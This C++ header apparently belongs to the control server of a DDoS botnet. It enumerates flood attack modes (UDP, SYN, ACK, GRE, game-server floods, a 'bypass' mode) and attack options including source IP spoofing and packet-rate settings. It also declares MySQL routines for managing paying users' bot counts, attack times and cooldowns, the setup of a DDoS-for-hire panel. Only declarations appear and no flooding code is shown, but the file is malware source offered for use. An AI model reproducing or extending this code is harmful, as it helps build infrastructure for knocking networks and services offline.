#pragma once

#include <fcntl.h>
#include <string>

#include "main.h"

enum
{
    FLOOD_UDPFLOOD = 1,
    FLOOD_ACKPLAIN = 2,
    FLOOD_SYNPLAIN = 3,
    FLOOD_UDPPLAIN = 4,
    FLOOD_SYNACK = 5,
    FLOOD_SYNFLOOD = 6,
    FLOOD_ACKFLOOD = 7,
    FLOOD_ACKPSH = 8,
    FLOOD_BYPASS = 9,
    FLOOD_UDPGRE = 10,
    FLOOD_UDPESP = 11,
    FLOOD_UDPHEX = 12,
    FLOOD_PROTORAND = 13,
    FLOOD_UDPFIVEM = 14,
    FLOOD_UDPVSE = 15,
    FLOOD_UDPRAND = 16,
    FLOOD_TCPSOCKET = 99,
    OPT_PORT = 1,
    OPT_SIZE = 2,
    OPT_THREAD_COUNT = 3,
    OPT_HTTP_PATH = 4,
    OPT_HTTP_CONNECTION = 5,
    OPT_DOMAIN = 6,
    OPT_TTL = 7,
    OPT_SOURCE_PORT = 8,
    OPT_TCP_ACK = 9,
    OPT_TCP_FIN = 10,
    OPT_TCP_URG = 11,
    OPT_TCP_PSH = 12,
    OPT_TCP_RST = 13,
    OPT_TCP_SYN = 14,
    OPT_TOS = 15,
    OPT_ID = 16,
    OPT_TCP_SEQ = 17,
    OPT_SOURCE_IP = 18,
    OPT_ACK_SEQ = 19,
    OPT_MAXPPS = 20,
    OPT_MINPPS = 21,
    OPT_MAXLEN = 22,
    OPT_MINLEN = 23,
    OPT_PAYLOAD = 24,
    OPT_BIND = 25,
    OPT_RAND = 26,
    OPT_PPS = 27, 
    OPT_HEX = 28

};

static int enable = 1;

#define NONBLOCK(fd) (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)))
#define REUSE_ADDR(fd) (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable)))
#define PACKED __attribute__((packed))

int mysql_login(struct admin *);
void mysql_set_restrictions(struct admin *);
void mysql_update_login(struct admin *, int);
void mysql_update_disable(struct admin *, const char *, int);
void mysql_add_user(struct admin *, const char*, const char*, const int, const int, const int, const int, const int, const int);
void mysql_update_users_conc(struct admin *, const char*, int);
void mysql_update_users_bots(struct admin *, const char*, int);
void mysql_update_users_time(struct admin *, const char*, int);
void mysql_update_users_cooldown(struct admin *, const char*, int);
void mysql_remove_user(struct admin *, const char*);
void mysql_get_client_information(struct admin *);
void mysql_clear_login(void);
void mysql_log(std::string, int, std::string, std::string, uint16_t);
int mysql_allow_concurrent(int, std::string, uint16_t, int, int);

struct command *command_process(struct process *);

int client_count(int);